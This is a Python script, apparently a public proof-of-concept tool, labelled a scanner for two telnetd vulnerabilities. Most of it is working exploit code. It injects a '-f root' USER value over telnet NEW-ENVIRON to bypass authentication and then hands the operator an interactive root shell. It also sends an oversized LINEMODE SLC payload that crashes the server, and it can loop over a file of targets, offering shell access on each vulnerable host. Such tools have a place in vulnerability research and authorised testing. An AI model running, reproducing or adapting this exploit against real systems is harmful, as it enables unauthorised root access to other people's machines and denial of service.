#!/usr/bin/env python3
"""
Interactive Telnet Vulnerability Scanner for:
    CVE-2026-32746 – Buffer overflow in LINEMODE SLC suboption (GNU InetUtils telnetd)
    CVE-2026-24061  – Authentication bypass via USER environment variable injection

If the bypass succeeds, you get an interactive root shell DIRECTLY in the same terminal.

"""

import socket
import sys
import time
import argparse
import select
import termios
import tty
import signal
import os
import threading
from contextlib import contextmanager

# Telnet protocol constants
IAC = b'\xff'
DO  = b'\xfd'
DONT = b'\xfe'
WILL = b'\xfb'
WONT = b'\xfc'
SB  = b'\xfa'
SE  = b'\xf0'

# Option numbers
TELOPT_LINEMODE = 34
TELOPT_NEW_ENVIRON = 39

# Verbose mode flag
VERBOSE = os.environ.get('TELNET_SCAN_VERBOSE', '0') == '1'

# Lookup tables for readable output
_CMD_NAMES = {b'\xfb': 'WILL', b'\xfc': 'WONT', b'\xfd': 'DO', b'\xfe': 'DONT'}
_OPT_NAMES = {
    0: 'BINARY', 1: 'ECHO', 3: 'SGA', 5: 'STATUS', 6: 'TIMING-MARK',
    24: 'TERMINAL-TYPE', 31: 'WINDOW-SIZE', 32: 'TERMINAL-SPEED',
    33: 'REMOTE-FLOW-CONTROL', 34: 'LINEMODE', 35: 'X-DISPLAY-LOCATION',
    36: 'OLD-ENVIRON', 39: 'NEW-ENVIRON', 37: 'AUTHENTICATION', 38: 'ENCRYPT',
}

def _opt_name(code):
    return _OPT_NAMES.get(code, f'OPT({code})')

def _decode_telnet(data):
    """Decode raw telnet bytes into human-readable protocol description."""
    parts = []
    i = 0
    while i < len(data):
        if data[i:i+1] == b'\xff' and i + 1 < len(data):
            cmd = data[i+1:i+2]
            if cmd in _CMD_NAMES and i + 2 < len(data):
                opt = data[i+2]
                parts.append(f'IAC {_CMD_NAMES[cmd]} {_opt_name(opt)}')
                i += 3
                continue
            elif cmd == b'\xfa':  # SB
                se_pos = data.find(b'\xff\xf0', i+2)
                if se_pos != -1:
                    opt = data[i+2]
                    sub = data[i+3:se_pos]
                    parts.append(f'IAC SB {_opt_name(opt)} [{len(sub)}B: {sub[:20].hex()}{"..." if len(sub)>20 else ""}] IAC SE')
                    i = se_pos + 2
                    continue
            i += 1
        else:
            # Collect printable text
            text_start = i
            while i < len(data) and data[i:i+1] != b'\xff':
                i += 1
            chunk = data[text_start:i]
            printable = chunk.decode('ascii', errors='replace').replace('\r', '\\r').replace('\n', '\\n')
            if printable.strip():
                parts.append(f'TEXT: "{printable.strip()}"')
    return parts

def vprint(*args, **kwargs):
    if VERBOSE:
        print(*args, **kwargs)

def send_iac(sock, command, option):
    """Send a single IAC command (e.g., IAC DO LINEMODE)."""
    try:
        payload = IAC + command + bytes([option])
        vprint(f'    [SEND] IAC {_CMD_NAMES.get(command, "?")} {_opt_name(option)}  ({payload.hex()})')
        sock.send(payload)
    except (socket.error, BrokenPipeError) as e:
        vprint(f'    [SEND] FAILED: {e}')

def send_subnegotiation(sock, option, data):
    """Send a full subnegotiation: IAC SB option data IAC SE."""
    try:
        payload = IAC + SB + bytes([option]) + data + IAC + SE
        vprint(f'    [SEND] IAC SB {_opt_name(option)} [{len(data)}B payload] IAC SE  ({len(payload)} bytes total)')
        if VERBOSE and len(data) <= 64:
            vprint(f'           payload hex: {data.hex()}')
        elif VERBOSE:
            vprint(f'           payload hex (first 64B): {data[:64].hex()}...')
        sock.send(payload)
    except (socket.error, BrokenPipeError) as e:
        vprint(f'    [SEND] FAILED: {e}')

def recv_until_timeout(sock, timeout=2):
    """Read available data until timeout, return bytes."""
    sock.settimeout(timeout)
    data = b''
    try:
        while True:
            chunk = sock.recv(1024)
            if not chunk:
                vprint(f'    [RECV] Connection closed (0 bytes)')
                break
            data += chunk
            vprint(f'    [RECV] {len(chunk)} bytes: {chunk.hex()}')
    except socket.timeout:
        if data:
            vprint(f'    [RECV] Total: {len(data)} bytes (timeout)')
        else:
            vprint(f'    [RECV] No data (timeout after {timeout}s)')
    except (socket.error, BrokenPipeError) as e:
        vprint(f'    [RECV] Error: {e}')
    except Exception:
        pass
    sock.settimeout(None)
    if VERBOSE and data:
        for line in _decode_telnet(data):
            vprint(f'           decoded: {line}')
    return data

def check_service_available(host, port, timeout=5):
    """Check if the telnet service is actually reachable"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((host, port))
        sock.close()
        return result == 0
    except Exception:
        return False

@contextmanager
def raw_mode(file):
    """Context manager to put terminal into raw mode and restore on exit."""
    old_attrs = termios.tcgetattr(file.fileno())
    tty.setraw(file.fileno())
    try:
        yield
    finally:
        termios.tcsetattr(file.fileno(), termios.TCSADRAIN, old_attrs)

def interactive_shell(sock):
    """
    Provide an interactive shell over the given socket.
    The shell appears DIRECTLY in this terminal window - no separate terminal needed.
    Type commands, press Enter, and see output immediately like a normal shell.
    Press Ctrl+C to exit the shell and return to the scanner menu.
    """
    print("\n" + "="*60)
    print("[+] ROOT SHELL OBTAINED! You are now in an interactive root shell.")
    print("[+] Type commands directly here. Press Ctrl+C to exit shell.")
    print("="*60 + "\n")
    
    try:
        with raw_mode(sys.stdin):
            while True:
                rlist, _, _ = select.select([sock, sys.stdin], [], [])
                for fd in rlist:
                    if fd is sock:
                        data = sock.recv(4096)
                        if not data:
                            print("\n[!] Connection closed by remote host.")
                            return
                        sys.stdout.buffer.write(data)
                        sys.stdout.flush()
                    elif fd is sys.stdin:
                        ch = sys.stdin.buffer.read(1)
                        if not ch:
                            return
                        sock.send(ch)
    except KeyboardInterrupt:
        print("\n\n[*] Exiting shell, returning to menu...")
    except Exception as e:
        print(f"\n[!] Error in interactive shell: {e}")

def _recv_wait(sock, timeout=3):
    """Read all available data, waiting up to timeout for first byte."""
    data = b''
    sock.settimeout(timeout)
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
            sock.settimeout(0.5)
    except socket.timeout:
        pass
    except (socket.error, BrokenPipeError):
        pass
    return data

def _negotiate_options(sock, timeout=15):
    """Complete the full telnet option negotiation handshake.

    Returns True if negotiation succeeded and login/shell stage was reached.
    The server's DO/WILL/SB exchanges are handled automatically.
    USER is set to '-f root' via NEW_ENVIRON to trigger auth bypass.
    """
    # Keep-alive: send IAC NOP every 2s to prevent EOF detection
    stop_ka = threading.Event()
    def _keepalive():
        while not stop_ka.is_set():
            try:
                sock.send(IAC + b'\xf1')  # IAC NOP
            except:
                break
            stop_ka.wait(2)
    ka_thread = threading.Thread(target=_keepalive, daemon=True)

    # Step 1: Wait for server's initial DO options (can take 5-10s for DNS)
    vprint(f"    [STEP 1/6] Waiting for server negotiation (may take up to {timeout}s)...")
    initial = _recv_wait(sock, timeout)
    if not initial:
        vprint(f"    [STEP 1/6] No response from server")
        return False
    vprint(f"    [STEP 1/6] Got {len(initial)} bytes: {initial.hex()}")
    if VERBOSE:
        for line in _decode_telnet(initial):
            vprint(f"               {line}")

    # Start keepalive before responding
    ka_thread.start()

    # Step 2: Respond WILL to TTYPE, TSPEED, XDISPLOC, NEW_ENVIRON; WONT to OLD_ENVIRON
    vprint(f"    [STEP 2/6] Responding WILL to all DO options")
    sock.send(IAC + WILL + b'\x18')  # WILL TERM-TYPE
    sock.send(IAC + WILL + b'\x20')  # WILL TERM-SPEED
    sock.send(IAC + WILL + b'\x23')  # WILL XDISPLOC
    sock.send(IAC + WILL + b'\x27')  # WILL NEW-ENVIRON
    sock.send(IAC + WONT + b'\x24')  # WONT OLD-ENVIRON

    # Step 3: Wait for SB SEND requests
    vprint(f"    [STEP 3/6] Waiting for SB SEND subnegotiation requests...")
    sb_data = _recv_wait(sock, 10)
    if not sb_data:
        vprint(f"    [STEP 3/6] No SB requests received")
        stop_ka.set()
        return False
    vprint(f"    [STEP 3/6] Got SB requests: {sb_data.hex()}")

    # Step 4: Respond to each subnegotiation with delays
    vprint(f"    [STEP 4/6] Sending subnegotiation responses...")

    time.sleep(0.3)
    sock.send(IAC + SB + b'\x20\x00' + b'38400,38400' + IAC + SE)
    vprint(f"               TERM-SPEED IS 38400,38400")

    time.sleep(0.3)
    sock.send(IAC + SB + b'\x23\x00' + IAC + SE)
    vprint(f"               XDISPLOC IS (empty)")

    time.sleep(0.3)
    # THE EXPLOIT: USER="-f root" -> login interprets as: login -f root
    sock.send(IAC + SB + b'\x27\x00\x00USER\x01-f root' + IAC + SE)
    vprint(f"               NEW-ENVIRON IS VAR USER VALUE \"-f root\"  *** EXPLOIT ***")

    time.sleep(0.3)
    sock.send(IAC + SB + b'\x18\x00xterm' + IAC + SE)
    vprint(f"               TERM-TYPE IS xterm")

    # Step 5: Handle remaining DO/WILL exchanges and wait for login/shell
    vprint(f"    [STEP 5/6] Handling remaining option negotiations...")
    got_shell = False
    got_login = False
    start = time.time()

    while time.time() - start < 30:
        data = _recv_wait(sock, 2)
        if not data:
            continue

        # Process telnet commands inline and collect text
        text = b''
        i = 0
        while i < len(data):
            if data[i] == 0xff and i + 2 < len(data):
                if data[i+1] == 0xfa:  # SB
                    se_pos = data.find(b'\xff\xf0', i)
                    if se_pos != -1:
                        opt = data[i+2]
                        # Respond to TTYPE SEND with xterm again
                        if opt == 0x18:
                            sock.send(IAC + SB + b'\x18\x00xterm' + IAC + SE)
                        i = se_pos + 2
                        continue
                elif data[i+1] == 0xfd:  # DO
                    opt = data[i+2]
                    sock.send(IAC + WILL + bytes([opt]))
                    i += 3
                    continue
                elif data[i+1] == 0xfb:  # WILL
                    opt = data[i+2]
                    sock.send(IAC + DO + bytes([opt]))
                    i += 3
                    continue
                else:
                    i += 3
                    continue
            text += bytes([data[i]])
            i += 1

        if text.strip():
            decoded = text.decode('ascii', errors='replace')
            vprint(f"    [STEP 5/6] Text received: {repr(decoded[:200])}")
            if any(p in text for p in [b'# ', b'root@']):
                got_shell = True
                break
            if b'$ ' in text:
                got_shell = True
                break
            if b'assword' in text:
                got_login = True
                vprint(f"    [STEP 5/6] Password prompt detected - bypass failed")
                break
            if b'ogin:' in text.lower():
                got_login = True
                break

    stop_ka.set()

    if got_shell:
        return True
    if got_login:
        return False
    vprint(f"    [STEP 5/6] Timeout waiting for shell/login prompt")
    return False


def test_cve_2026_24061(host, port):
    """
    CVE-2026-24061: argument injection via USER environment variable.
    Sends USER="-f root" using NEW_ENVIRON subnegotiation.
    If a shell is obtained, return the socket for interactive use.
    Otherwise, return None.
    """
    print("[*] Testing CVE-2026-24061 (authentication bypass)...")
    vprint(f"    [INFO] CVE-2026-24061 exploits login(1) argument injection via telnet NEW_ENVIRON")
    vprint(f"    [INFO] Attack: set USER=\"-f root\" -> login -p -h <host> -f root (passwordless)")
    sock = None
    try:
        if not check_service_available(host, port, timeout=10):
            print(f"[-] Service not reachable on {host}:{port}")
            return None

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        vprint(f"    [STEP 0/6] Connected to {host}:{port}")

        success = _negotiate_options(sock, timeout=15)

        if success:
            print("[!] CVE-2026-24061: VULNERABLE – root shell obtained!")
            vprint(f"    [RESULT] SUCCESS: Passwordless root login via USER=\"-f root\" injection")
            vprint(f"    [RESULT] login(1) was called as: login -p -h <host> -f root")
            sock.settimeout(None)
            return sock
        else:
            print("[+] CVE-2026-24061: Not exploitable (server presented login/password prompt)")
            vprint(f"    [RESULT] The server's login binary rejected the -f flag or")
            vprint(f"             the telnetd did not pass USER to login as an argument")
            sock.close()
            return None
    except socket.timeout:
        print("[-] Connection timeout - target may be unreachable or firewalled")
        if sock:
            sock.close()
        return None
    except ConnectionRefusedError:
        print("[-] Connection refused - service not running on port")
        if sock:
            sock.close()
        return None
    except Exception as e:
        print(f"[-] Error during CVE-2026-24061 test: {e}")
        if sock:
            sock.close()
        return None

def test_cve_2026_32746(host, port):
    """
    CVE-2026-32746: buffer overflow in LINEMODE SLC suboption.
    Sends a large number of SLC triplets to overflow the fixed-size buffer.
    If the server crashes (connection reset), it is likely vulnerable.
    """
    print("[*] Testing CVE-2026-32746 (buffer overflow)...")
    vprint(f"    [INFO] CVE-2026-32746 targets a fixed-size buffer in telnetd's LINEMODE SLC handler")
    vprint(f"    [INFO] Attack: send 500 SLC triplets (1500 bytes) to overflow the stack buffer")
    sock = None
    try:
        if not check_service_available(host, port, timeout=3):
            print(f"[-] Service not reachable on {host}:{port}")
            return False

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, port))
        vprint(f"    [STEP 1/5] Connected to {host}:{port}")

        vprint(f"    [STEP 2/5] Negotiating LINEMODE option with server")
        send_iac(sock, DO, TELOPT_LINEMODE)
        send_iac(sock, WILL, TELOPT_LINEMODE)
        vprint(f"    [STEP 2/5] Waiting for server LINEMODE response...")
        recv_until_timeout(sock, 1)

        triplet = b'\x01\x01\x00'
        overflow_data = triplet * 500
        subdata = b'\x00' + overflow_data
        vprint(f"    [STEP 3/5] Building overflow payload:")
        vprint(f"               SLC triplet: 0x{triplet.hex()} (SLC_SYNCH + SLC_NOSUPPORT)")
        vprint(f"               Repetitions: 500 triplets = {len(overflow_data)} bytes")
        vprint(f"               Total subnegotiation payload: {len(subdata)} bytes")
        vprint(f"               Expected server buffer: ~256 bytes (will overflow by ~1244 bytes)")
        vprint(f"    [STEP 3/5] Sending overflow payload...")
        send_subnegotiation(sock, TELOPT_LINEMODE, subdata)

        vprint(f"    [STEP 4/5] Waiting 1s for server to process the overflow...")
        time.sleep(1)
        vprint(f"    [STEP 5/5] Sending probe (\\r\\n) to check if server is still alive...")
        sock.send(b'\r\n')
        response = recv_until_timeout(sock, 2)
        if response:
            print("[+] Server did NOT crash; likely not vulnerable to CVE-2026-32746")
            vprint(f"    [RESULT] Server responded with {len(response)} bytes after overflow attempt")
            vprint(f"    [RESULT] The SLC buffer may be dynamically allocated or bounds-checked")
            return False
        else:
            print("[!] CVE-2026-32746: VULNERABLE - server crashed! (connection dropped after overflow)")
            vprint(f"    [RESULT] Server stopped responding after receiving {len(subdata)} byte SLC payload")
            vprint(f"    [RESULT] The telnetd process likely segfaulted due to stack buffer overflow")
            vprint(f"    [RESULT] Impact: Denial of Service confirmed, potential Remote Code Execution")
            return True
    except socket.timeout:
        print("[-] Connection timeout during test - target may be unreachable")
        return False
    except ConnectionRefusedError:
        print("[-] Connection refused - service not running")
        return False
    except (socket.error, BrokenPipeError, ConnectionResetError) as e:
        if isinstance(e, (ConnectionResetError, BrokenPipeError)) or "reset" in str(e).lower():
            print(f"[!] CVE-2026-32746: VULNERABLE (server crashed: {e})")
            return True
        else:
            print(f"[-] Connection error: {e}")
            return False
    except Exception as e:
        print(f"[-] Error during CVE-2026-32746 test: {e}")
        return False
    finally:
        try:
            if sock:
                sock.close()
        except:
            pass

def scan_from_file(filename, port, test_choice):
    """Read IPs from file and scan each one"""
    try:
        with open(filename, 'r') as f:
            targets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        
        if not targets:
            print("[-] No targets found in file")
            return
        
        print(f"\n[*] Loaded {len(targets)} targets from {filename}\n")
        
        results = []
        for i, target in enumerate(targets, 1):
            print(f"\n{'='*50}")
            print(f"[{i}/{len(targets)}] Scanning {target}:{port}")
            print('='*50)
            
            try:
                host = socket.gethostbyname(target)
                print(f"[*] Resolved {target} -> {host}")
            except socket.gaierror:
                print(f"[-] Cannot resolve {target}")
                results.append({'target': target, 'status': 'DNS resolution failed'})
                continue
            
            if not check_service_available(host, port, timeout=3):
                print(f"[-] Service not reachable on {host}:{port}")
                results.append({'target': target, 'status': 'Service unreachable'})
                continue
            
            print("[+] Service reachable")
            
            if test_choice == "2" or test_choice == "1":
                print("\n[*] Testing CVE-2026-24061...")
                shell_sock = test_cve_2026_24061(host, port)
                if shell_sock:
                    print(f"[!] {target}: VULNERABLE to CVE-2026-24061")
                    results.append({'target': target, 'status': 'VULNERABLE to CVE-2026-24061'})
                    # Option to interact with shell
                    print("\n[?] Shell obtained! Interact now? (y/N): ", end='')
                    choice = input().strip().lower()
                    if choice == 'y':
                        interactive_shell(shell_sock)
                    try:
                        shell_sock.close()
                    except:
                        pass
                else:
                    results.append({'target': target, 'status': 'Not vulnerable to CVE-2026-24061'})
            
            if test_choice == "3" or test_choice == "1":
                print("\n[*] Testing CVE-2026-32746...")
                vuln = test_cve_2026_32746(host, port)
                if vuln:
                    results.append({'target': target, 'status': 'VULNERABLE to CVE-2026-32746'})
                else:
                    if test_choice == "1":
                        # Don't overwrite if already have a status
                        pass
                    else:
                        results.append({'target': target, 'status': 'Not vulnerable to CVE-2026-32746'})
            
            print()
        
        # Print summary
        print("\n" + "="*60)
        print("SCAN SUMMARY")
        print("="*60)
        for result in results:
            print(f"{result['target']}: {result['status']}")
        print("="*60)
        
    except FileNotFoundError:
        print(f"[-] File not found: {filename}")
    except Exception as e:
        print(f"[-] Error reading file: {e}")

def interactive_menu():
    print("=== Telnet Vulnerability Scanner ===")
    print("1. Scan a single target")
    print("2. Scan targets from file (one IP/hostname per line)")
    print("3. Exit")
    choice = input("\nChoose option: ").strip()
    
    if choice == "3":
        sys.exit(0)
    
    port = input("Port (default 23): ").strip()
    if not port:
        port = 23
    else:
        try:
            port = int(port)
        except ValueError:
            print("Invalid port, using 23.")
            port = 23
    
    # Test selection
    print("\nWhich tests to run?")
    print("1. Both")
    print("2. Only CVE-2026-24061 (auth bypass - gives shell if vulnerable)")
    print("3. Only CVE-2026-32746 (buffer overflow detection)")
    test_choice = input("Choice [1-3]: ").strip()
    
    if choice == "1":
        # Single target
        target = input("Target (IP or domain): ").strip()
        
        try:
            host = socket.gethostbyname(target)
            print(f"[*] Resolved {target} -> {host}")
        except socket.gaierror:
            print(f"[-] Cannot resolve {target}")
            return
        
        print(f"\n[*] Scanning {host}:{port}...\n")
        
        if not check_service_available(host, port, timeout=5):
            print(f"[-] No service detected on {host}:{port}")
            print("    - Service not running or firewall blocking")
            input("\nPress Enter to continue...")
            return
        
        print("[+] Service reachable\n")
        
        if test_choice == "2":
            shell_sock = test_cve_2026_24061(host, port)
            if shell_sock:
                interactive_shell(shell_sock)
                try:
                    shell_sock.close()
                except:
                    pass
        elif test_choice == "3":
            test_cve_2026_32746(host, port)
        else:
            shell_sock = test_cve_2026_24061(host, port)
            if shell_sock:
                interactive_shell(shell_sock)
                try:
                    shell_sock.close()
                except:
                    pass
            print("\n" + "="*50)
            test_cve_2026_32746(host, port)
        
        input("\nPress Enter to continue...")
    
    elif choice == "2":
        # Scan from file
        filename = input("Enter filename with targets (one per line): ").strip()
        scan_from_file(filename, port, test_choice)
        input("\nPress Enter to continue...")
    
    else:
        print("Invalid choice.")

def main():
    def signal_handler(sig, frame):
        print("\n[!] Exiting.")
        sys.exit(0)
    signal.signal(signal.SIGINT, signal_handler)
    
    if sys.platform == 'win32':
        print("[-] Warning: This script is designed for Unix-like systems (Linux/macOS)")
        print("    The interactive shell may not work properly on Windows.")
        response = input("Continue anyway? (y/N): ").strip().lower()
        if response != 'y':
            sys.exit(0)
    
    while True:
        try:
            interactive_menu()
        except KeyboardInterrupt:
            print("\n[!] Interrupted by user.")
            sys.exit(0)
        except Exception as e:
            print(f"\n[-] Unexpected error: {e}")
            response = input("Continue? (y/N): ").strip().lower()
            if response != 'y':
                sys.exit(0)

if __name__ == "__main__":
    main()
